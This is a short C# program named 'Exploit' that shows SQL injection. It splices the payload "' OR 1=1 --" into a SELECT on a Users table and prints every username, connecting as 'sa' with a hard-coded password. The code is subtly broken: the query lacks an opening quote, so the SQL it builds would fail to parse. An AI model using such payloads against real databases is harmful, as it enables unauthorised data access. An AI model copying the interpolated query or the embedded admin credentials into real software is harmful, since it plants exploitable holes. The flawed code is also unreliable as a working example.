using System;
using System.Data;
using System.Data.SqlClient;
using System.Text;

public class Exploit
{
    public static void Main()
    {
        string connectionString = "Data Source=localhost;Initial Catalog=MyDatabase;User ID=sa;Password=myPassword";
        string inject = "' OR 1=1 --"; // Inject any string to bypass the filter

        using (var connection = new SqlConnection(connectionString))
        {
            connection.Open();
            using (var command = new SqlCommand($"SELECT * FROM Users WHERE Username = {inject}", connection))
            {
                using (var reader = command.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        // Process the result set
                        Console.WriteLine(reader["Username"]);
                    }
                }
            }
        }
    }
}
